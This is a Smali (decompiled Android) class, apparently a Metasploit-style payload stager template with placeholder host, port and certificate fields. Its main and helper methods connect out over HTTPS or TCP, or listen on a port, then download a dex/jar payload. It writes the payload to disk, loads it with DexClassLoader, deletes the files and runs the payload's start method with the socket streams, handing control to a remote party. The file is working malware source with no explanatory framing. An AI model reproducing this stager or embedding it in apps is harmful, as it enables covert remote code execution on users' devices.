.class public PLACEHOLDER/HttpsActivity;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static final CERT_HASH:Ljava/lang/String; = "WWWW"

.field public static final TIMEOUTS:Ljava/lang/String; = "TTTT604800-300-3600-10"

.field public static final URL:Ljava/lang/String; = "ZZZZhttps://IP_ADDR:END_PORT/qFTHTkSl1FhadlllA0gBcg882wlHLDmhMn6j1_ykMcArMkXkE-KOQ3RV-W7JtI5nf7x65a3fwcwgLEPvnCgmeb2f0m-VVEm_qAMZzFhGdNn8F46OtF_FJAP1b1AjG5x8X-GGH-rekgabzOzEMkQkgqYuUl"

.field public static comm_timeout:J

.field private static parameters:[Ljava/lang/String;

.field public static retry_total:J

.field public static retry_wait:J

.field public static session_expiry:J


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 23
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static main([Ljava/lang/String;)V
    .locals 22
    .param p0, "args"    # [Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 59
    if-eqz p0, :cond_0

    .line 60
    const/16 v18, 0x1

    move/from16 v0, v18

    new-array v0, v0, [Ljava/lang/String;

    move-object/from16 v18, v0

    const/16 v19, 0x0

    new-instance v20, Ljava/io/File;

    const-string v21, "."

    invoke-direct/range {v20 .. v21}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {v20 .. v20}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v20

    aput-object v20, v18, v19

    sput-object v18, PLACEHOLDER/HttpsActivity;->parameters:[Ljava/lang/String;

    .line 62
    :cond_0
    const-wide/16 v6, -0x1

    .line 63
    .local v6, "currentTime":J
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v10

    .line 64
    .local v10, "payloadStart":J
    const-string v18, "TTTT604800-300-3600-10"

    const/16 v19, 0x4

    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v9

    .line 65
    .local v9, "timeoutString":Ljava/lang/String;
    invoke-virtual {v9}, Ljava/lang/String;->length()I

    move-result v18

    const/16 v19, 0x3

    move/from16 v0, v18

    move/from16 v1, v19

    if-le v0, v1, :cond_1

    .line 66
    const-string v18, "-"

    move-object/from16 v0, v18

    invoke-virtual {v9, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v16

    .line 68
    .local v16, "timeouts":[Ljava/lang/String;
    const/16 v18, 0x1

    :try_start_0
    aget-object v18, v16, v18

    invoke-static/range {v18 .. v18}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v18

    move/from16 v0, v18

    int-to-long v4, v0

    .line 69
    .local v4, "commTimeout":J
    const/16 v18, 0x2

    aget-object v18, v16, v18

    invoke-static/range {v18 .. v18}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v18

    move/from16 v0, v18

    int-to-long v12, v0

    .line 70
    .local v12, "retryTotal":J
    const/16 v18, 0x3

    aget-object v18, v16, v18

    invoke-static/range {v18 .. v18}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v18

    move/from16 v0, v18

    int-to-long v14, v0

    .line 71
    .local v14, "retryWait":J
    sget-object v18, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const/16 v19, 0x0

    aget-object v19, v16, v19

    invoke-static/range {v19 .. v19}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v19

    move/from16 v0, v19

    int-to-long v0, v0

    move-wide/from16 v20, v0

    move-object/from16 v0, v18

    move-wide/from16 v1, v20

    invoke-virtual {v0, v1, v2}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v18

    add-long v18, v18, v10

    sput-wide v18, PLACEHOLDER/HttpsActivity;->session_expiry:J

    .line 72
    sget-object v18, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    move-object/from16 v0, v18

    invoke-virtual {v0, v4, v5}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v18

    sput-wide v18, PLACEHOLDER/HttpsActivity;->comm_timeout:J

    .line 73
    sget-object v18, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    move-object/from16 v0, v18

    invoke-virtual {v0, v12, v13}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v18

    sput-wide v18, PLACEHOLDER/HttpsActivity;->retry_total:J

    .line 74
    sget-object v18, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    move-object/from16 v0, v18

    invoke-virtual {v0, v14, v15}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v18

    sput-wide v18, PLACEHOLDER/HttpsActivity;->retry_wait:J

    .line 75
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-wide v6

    .line 80
    .end local v4    # "commTimeout":J
    .end local v12    # "retryTotal":J
    .end local v14    # "retryWait":J
    .end local v16    # "timeouts":[Ljava/lang/String;
    :cond_1
    const-string v18, "ZZZZhttps://IP_ADDR:END_PORT/qFTHTkSl1FhadlllA0gBcg882wlHLDmhMn6j1_ykMcArMkXkE-KOQ3RV-W7JtI5nf7x65a3fwcwgLEPvnCgmeb2f0m-VVEm_qAMZzFhGdNn8F46OtF_FJAP1b1AjG5x8X-GGH-rekgabzOzEMkQkgqYuUl"

    const/16 v19, 0x4

    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v17

    .line 81
    .local v17, "url":Ljava/lang/String;
    sget-wide v18, PLACEHOLDER/HttpsActivity;->retry_total:J

    add-long v18, v18, v10

    cmp-long v18, v6, v18

    if-gez v18, :cond_2

    sget-wide v18, PLACEHOLDER/HttpsActivity;->session_expiry:J

    cmp-long v18, v6, v18

    if-gez v18, :cond_2

    .line 91
    const-string v18, "tcp"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v18

    if-eqz v18, :cond_3

    .line 92
    invoke-static/range {v17 .. v17}, PLACEHOLDER/HttpsActivity;->runStagefromTCP(Ljava/lang/String;)V

    .line 97
    .end local v17    # "url":Ljava/lang/String;
    :cond_2
    :goto_0
    return-void

    .line 76
    .restart local v16    # "timeouts":[Ljava/lang/String;
    :catch_0
    move-exception v8

    .line 77
    .local v8, "e":Ljava/lang/NumberFormatException;
    goto :goto_0

    .line 94
    .end local v8    # "e":Ljava/lang/NumberFormatException;
    .end local v16    # "timeouts":[Ljava/lang/String;
    .restart local v17    # "url":Ljava/lang/String;
    :cond_3
    invoke-static/range {v17 .. v17}, PLACEHOLDER/HttpsActivity;->runStageFromHTTP(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private static readAndRunStage(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/String;)V
    .locals 13
    .param p0, "in"    # Ljava/io/DataInputStream;
    .param p1, "out"    # Ljava/io/OutputStream;
    .param p2, "parameters"    # [Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 129
    const/4 v9, 0x0

    aget-object v7, p2, v9

    .line 130
    .local v7, "path":Ljava/lang/String;
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    sget-char v10, Ljava/io/File;->separatorChar:C

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "payload.jar"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 131
    .local v4, "filePath":Ljava/lang/String;
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    sget-char v10, Ljava/io/File;->separatorChar:C

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "payload.dex"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 132
    .local v2, "dexPath":Ljava/lang/String;
    invoke-virtual {p0}, Ljava/io/DataInputStream;->readInt()I

    move-result v9

    new-array v1, v9, [B

    .line 133
    .local v1, "core":[B
    invoke-virtual {p0, v1}, Ljava/io/DataInputStream;->readFully([B)V

    .line 134
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    .line 135
    .local v0, "classFile":Ljava/lang/String;
    invoke-virtual {p0}, Ljava/io/DataInputStream;->readInt()I

    move-result v9

    new-array v1, v9, [B

    .line 136
    invoke-virtual {p0, v1}, Ljava/io/DataInputStream;->readFully([B)V

    .line 137
    new-instance v3, Ljava/io/File;

    invoke-direct {v3, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 138
    .local v3, "file":Ljava/io/File;
    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v9

    if-nez v9, :cond_0

    .line 139
    invoke-virtual {v3}, Ljava/io/File;->createNewFile()Z

    .line 141
    :cond_0
    new-instance v5, Ljava/io/FileOutputStream;

    invoke-direct {v5, v3}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 142
    .local v5, "fop":Ljava/io/FileOutputStream;
    invoke-virtual {v5, v1}, Ljava/io/FileOutputStream;->write([B)V

    .line 143
    invoke-virtual {v5}, Ljava/io/FileOutputStream;->flush()V

    .line 144
    invoke-virtual {v5}, Ljava/io/FileOutputStream;->close()V

    .line 145
    new-instance v9, Ldalvik/system/DexClassLoader;

    const-class v10, PLACEHOLDER/HttpsActivity;

    invoke-virtual {v10}, Ljava/lang/Class;->getClassLoader()Ljava/lang/ClassLoader;

    move-result-object v10

    invoke-direct {v9, v4, v7, v7, v10}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    invoke-virtual {v9, v0}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v6

    .line 146
    .local v6, "myClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    invoke-virtual {v6}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v8

    .line 147
    .local v8, "stage":Ljava/lang/Object;
    invoke-virtual {v3}, Ljava/io/File;->delete()Z

    .line 148
    new-instance v9, Ljava/io/File;

    invoke-direct {v9, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9}, Ljava/io/File;->delete()Z

    .line 149
    const-string v9, "start"

    const/4 v10, 0x3

    new-array v10, v10, [Ljava/lang/Class;

    const/4 v11, 0x0

    const-class v12, Ljava/io/DataInputStream;

    aput-object v12, v10, v11

    const/4 v11, 0x1

    const-class v12, Ljava/io/OutputStream;

    aput-object v12, v10, v11

    const/4 v11, 0x2

    const-class v12, [Ljava/lang/String;

    aput-object v12, v10, v11

    invoke-virtual {v6, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    const/4 v10, 0x3

    new-array v10, v10, [Ljava/lang/Object;

    const/4 v11, 0x0

    aput-object p0, v10, v11

    const/4 v11, 0x1

    aput-object p1, v10, v11

    const/4 v11, 0x2

    aput-object p2, v10, v11

    invoke-virtual {v9, v8, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 150
    const-wide/16 v10, -0x1

    sput-wide v10, PLACEHOLDER/HttpsActivity;->session_expiry:J

    .line 151
    return-void
.end method

.method private static runStageFromHTTP(Ljava/lang/String;)V
    .locals 8
    .param p0, "url"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    const/4 v7, 0x1

    const/4 v6, 0x0

    .line 101
    const-string v2, "https"

    invoke-virtual {p0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 102
    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, p0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v1

    .line 103
    .local v1, "uc":Ljava/net/URLConnection;
    const-string v2, "OILYOLO"

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    const-string v3, "useFor"

    new-array v4, v7, [Ljava/lang/Class;

    const-class v5, Ljava/net/URLConnection;

    aput-object v5, v4, v6

    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    const/4 v3, 0x0

    new-array v4, v7, [Ljava/lang/Object;

    aput-object v1, v4, v6

    invoke-virtual {v2, v3, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 104
    invoke-virtual {v1}, Ljava/net/URLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    .line 108
    .end local v1    # "uc":Ljava/net/URLConnection;
    .local v0, "inStream":Ljava/io/InputStream;
    :goto_0
    new-instance v2, Ljava/io/DataInputStream;

    invoke-direct {v2, v0}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    new-instance v3, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v4, PLACEHOLDER/HttpsActivity;->parameters:[Ljava/lang/String;

    invoke-static {v2, v3, v4}, PLACEHOLDER/HttpsActivity;->readAndRunStage(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/String;)V

    .line 109
    return-void

    .line 106
    .end local v0    # "inStream":Ljava/io/InputStream;
    :cond_0
    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, p0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/net/URL;->openStream()Ljava/io/InputStream;

    move-result-object v0

    .restart local v0    # "inStream":Ljava/io/InputStream;
    goto :goto_0
.end method

.method private static runStagefromTCP(Ljava/lang/String;)V
    .locals 8
    .param p0, "url"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    const/4 v7, 0x2

    .line 113
    const-string v5, ":"

    invoke-virtual {p0, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 114
    .local v1, "parts":[Ljava/lang/String;
    aget-object v5, v1, v7

    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    .line 115
    .local v2, "port":I
    const/4 v5, 0x1

    aget-object v5, v1, v5

    const-string v6, "/"

    invoke-virtual {v5, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    aget-object v0, v5, v7

    .line 116
    .local v0, "host":Ljava/lang/String;
    const-string v5, ""

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    .line 117
    new-instance v3, Ljava/net/ServerSocket;

    invoke-direct {v3, v2}, Ljava/net/ServerSocket;-><init>(I)V

    .line 118
    .local v3, "server":Ljava/net/ServerSocket;
    invoke-virtual {v3}, Ljava/net/ServerSocket;->accept()Ljava/net/Socket;

    move-result-object v4

    .line 119
    .local v4, "sock":Ljava/net/Socket;
    invoke-virtual {v3}, Ljava/net/ServerSocket;->close()V

    .line 123
    .end local v3    # "server":Ljava/net/ServerSocket;
    :goto_0
    if-eqz v4, :cond_0

    .line 124
    new-instance v5, Ljava/io/DataInputStream;

    invoke-virtual {v4}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    new-instance v6, Ljava/io/DataOutputStream;

    invoke-virtual {v4}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    sget-object v7, PLACEHOLDER/HttpsActivity;->parameters:[Ljava/lang/String;

    invoke-static {v5, v6, v7}, PLACEHOLDER/HttpsActivity;->readAndRunStage(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/String;)V

    .line 126
    :cond_0
    return-void

    .line 121
    .end local v4    # "sock":Ljava/net/Socket;
    :cond_1
    new-instance v4, Ljava/net/Socket;

    invoke-direct {v4, v0, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    .restart local v4    # "sock":Ljava/net/Socket;
    goto :goto_0
.end method

.method public static start(Landroid/content/Context;)V
    .locals 1
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 38
    invoke-virtual {p0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, PLACEHOLDER/HttpsActivity;->startInPath(Ljava/lang/String;)V

    .line 39
    return-void
.end method

.method public static startAsync()V
    .locals 1

    .prologue
    .line 42
    new-instance v0, PLACEHOLDER/HttpsActivity1;

    invoke-direct {v0}, PLACEHOLDER/HttpsActivity1;-><init>()V

    .line 50
    invoke-virtual {v0}, PLACEHOLDER/HttpsActivity1;->start()V

    .line 51
    return-void
.end method

.method public static startInPath(Ljava/lang/String;)V
    .locals 2
    .param p0, "path"    # Ljava/lang/String;

    .prologue
    .line 54
    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    aput-object p0, v0, v1

    sput-object v0, PLACEHOLDER/HttpsActivity;->parameters:[Ljava/lang/String;

    .line 55
    invoke-static {}, PLACEHOLDER/HttpsActivity;->startAsync()V

    .line 56
    return-void
.end method
